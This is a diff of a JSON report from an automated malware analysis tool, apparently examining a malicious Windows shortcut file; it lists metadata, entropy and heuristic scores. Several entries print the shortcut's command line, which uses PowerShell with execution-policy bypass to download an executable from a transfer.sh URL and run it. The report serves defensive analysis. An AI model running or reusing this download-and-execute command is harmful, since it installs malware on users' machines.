@@ -1,42 +1,190 @@
 {
-    "response": {
-        "supplementary": [
-            "25841ded09c840ca54070584a6fd6c928265a5e0f5696eb135f8d67b5b804873"
-        ],
-        "extracted": [
-            {
-                "name": "6d48a4ef90.bat",
-                "sha256": "6d48a4ef9003ba72e7cc7e7a26720e2d22a2ffaee62dd84b016e207ba154baf2"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            5
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 501,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [3.5568722131874067, 3.622710391423566, 2.831079759136178, 2.6235166412180155, 4.032927742075166, 2.8310797591361774, 3.3524319345955504, 2.132653072120442, 4.121340988555424, 2.6269575422544533, 2.898108801295028, 2.951087407105864, 3.0115729268698375, 3.0040660129166996, 2.9605148108688075, 3.09041649360272, 2.845130195484192, 3.042527551378238, 2.9220532724072688, 3.3919954870390194, 4.853252260352434, 5.108999573868719, 2.6627165379407263, -0.0, -0.0, -0.0, 0.2736549202807799, 2.745894788124495, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, -0.0, 0.1370994788998177, 2.422266527009766, 3.1963737052243917, 2.4406363526732666, 3.9442221694400907, 3.719794460823448, 2.628878032064259, 3.315018083731258, 2.3188099464394867, 1.5125680924309957, 1.4237685873752954, 1.5125680924309957, 3.3774784196897216, 0.5907239186406503]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 3.472",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, ExpString\", \"file_attributes\": \"Archive\", \"create_date\": \"2021:02:23 13:01:44+00:00\", \"access_date\": \"2022:03:28 23:43:54+00:00\", \"modify_date\": \"2021:02:23 13:01:44+00:00\", \"target_file_size\": 236544, \"icon_index\": 133, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"drive_type\": \"Fixed Disk\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"command_line_arguments\": \"/c  timeout /t 1 /nobreak && powershell -exec bypass \\\"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\\\" && timeout /t 1 /nobreak & start /b videoplayer.exe\", \"icon_file_name\": \"%windir%\\\\system32\\\\imageres.dll\", \"machine_id\": \"desktop-vsfqmp4\", \"fill_attributes\": \"0x07\", \"popup_fill_attributes\": \"0xf5\", \"screen_buffer_size\": \"120 x 9001\", \"window_size\": \"120 x 30\", \"window_origin\": \"0 x 0\", \"font_size\": \"0 x 16\", \"font_family\": \"Unknown (0x36)\", \"font_weight\": 400, \"font_name\": \"Consolas\", \"cursor_size\": 25, \"full_screen\": \"No\", \"quick_edit\": \"Yes\", \"insert_mode\": \"Yes\", \"window_origin_auto\": \"Yes\", \"history_buffer_size\": 50, \"num_history_buffers\": 4, \"remove_history_duplicates\": \"No\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.date.creation": [
+          "file": {
+            "date": {
+              "creation": [
                 "2021:02:23 13:01:44+00:00"
-            ],
-            "file.date.last_modified": [
+              ],
+              "last_modified": [
                 "2021:02:23 13:01:44+00:00"
-            ],
-            "file.shortcut.icon_location": [
-                "%windir%\\system32\\imageres.dll"
-            ],
-            "file.shortcut.machine_id": [
-                "desktop-vsfqmp4"
-            ],
-            "file.shortcut.tracker_mac": [
-                "90:1B:0E:14:5D:09"
-            ],
-            "file.shortcut.command_line": [
-                "..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
-            ],
-            "file.name.extracted": [
+              ]
+            }
+          }
+        },
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {
+          "file": {
+            "name": {
+              "extracted": [
                 "cmd.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "C:\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
+              ],
+              "icon_location": [
+                "%windir%\\system32\\imageres.dll"
+              ],
+              "machine_id": [
+                "desktop-vsfqmp4"
+              ],
+              "tracker_mac": [
+                "90:1B:0E:14:5D:09"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"machine_identifier\": \"desktop-vsfqmp4\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 1,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Probably created in a VM",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"command_line_arguments\": \"/c  timeout /t 1 /nobreak && powershell -exec bypass \\\"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\\\" && timeout /t 1 /nobreak & start /b videoplayer.exe\", \"local_base_path\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"relative_path\": \"..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\cmd.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "f65fc059b3.bat",
+        "sha256": "f65fc059b3f7a8837d940f29649765503319e9a5d9dbfb04caeb6b8abdce35fe"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "25841ded09c840ca54070584a6fd6c928265a5e0f5696eb135f8d67b5b804873"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.date.creation": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "2021:02:23 13:01:44+00:00"
         }
-    }
+      ],
+      "file.date.last_modified": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "2021:02:23 13:01:44+00:00"
+        }
+      ],
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "cmd.exe"
+        }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "C:\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "%windir%\\system32\\imageres.dll"
+        }
+      ],
+      "file.shortcut.machine_id": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "desktop-vsfqmp4"
+        }
+      ],
+      "file.shortcut.tracker_mac": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "90:1B:0E:14:5D:09"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
